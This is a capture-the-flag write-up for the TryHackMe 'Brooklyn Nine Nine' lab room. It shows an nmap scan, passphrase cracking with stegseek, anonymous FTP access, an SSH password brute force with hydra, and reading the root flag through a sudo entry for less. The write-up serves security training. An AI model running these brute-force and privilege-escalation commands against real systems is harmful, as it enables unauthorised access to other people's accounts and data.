# THM-Brooklyn-Nine-Nine-WriteUp

Write up for https://tryhackme.com/room/brooklynninenine (Visit tryhackme.com for more)

## Setting up and information gathering

For this CTF I've added an entry 'ninenine' to /etc/hosts pointing at the box IP

Next, I started an nmap syn scan (default type when run as root) on the host and got the following:

(`nmap -A ninenine`)

```          
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.67.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

## Flag 1

I've head to the hosted website and found a low quality background picture of Brooklyn Nine Nine. Inspecting the source reveals this comment:
`<!-- Have you ever heard of steganography? -->`
Well, yes I do!
I downloaded the picture and tried to extract datas from it: 

```
└─# steghide extract -sf brooklyn99.jpg
Enter passhphrase:
```

It asked for a passphrase which I tried to break with stegseek (https://github.com/RickdeJager/stegseek)

```
└─# stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "[*CENSORED*]"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

This is the content of the exctracted file:

```
Holts Password:
[*CENSORED*]
```

Next step is to ssh into the server with user holt and find the flag in /home/holt/user.txt 

## Flag 2

I still needed to check out the FTP server which allowed Anonymoys login and contained the file note_to_jake.txt

```
└─# ftp ninenine
Connected to ninenine.
220 (vsFTPd 3.0.3)
Name (ninenine:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.07 secs (1.6572 kB/s)
```

The file contains the following:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Knowing another username (jake) and that he has a 'too weak' password it's time to bruteforce:

```
└─# hydra nine -f -l jake -P /usr/share/wordlists/rockyou.txt ssh                                                                                 

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-19 05:02:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://nine:22/
[22][ssh] host: nine   login: jake   password: [*CENSORED*]
[STATUS] attack finished for nine (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-19 05:02:35
```

First thing I've done after sshed into the server with jake was checking sudo's permissions

```
jake@brookly_nine_nine:~$ sudo -l -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/bin/less
```

I took a shot by running `sudo less /root/root.txt` and easily found last flag


